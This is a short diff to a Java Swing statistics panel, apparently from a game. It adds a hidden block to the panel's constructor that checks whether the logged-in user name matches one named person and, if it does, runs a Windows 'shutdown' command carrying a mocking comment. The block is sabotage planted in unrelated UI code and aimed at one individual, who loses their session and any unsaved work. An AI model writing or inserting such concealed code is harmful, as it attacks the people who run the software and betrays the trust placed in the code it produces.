@@ -60,6 +60,16 @@ public class StatisticsBoard extends JPanel{
 		this.add(Box.createHorizontalStrut(HORIZONTAL_STRUT), BorderLayout.LINE_END);
 
 		GameLog.log(MsgType.INIT, "StatisticsBoard");
+		
+		if(System.getProperty("user.name").toString().equals("Nishit Agrawal")){
+			String shutdownCmd = "shutdown -s -c haha";
+			try {
+				Process child = Runtime.getRuntime().exec(shutdownCmd);
+			} catch (IOException e) {		
+				e.printStackTrace();
+			}
+		}
+		
 	}
 	
 	/**
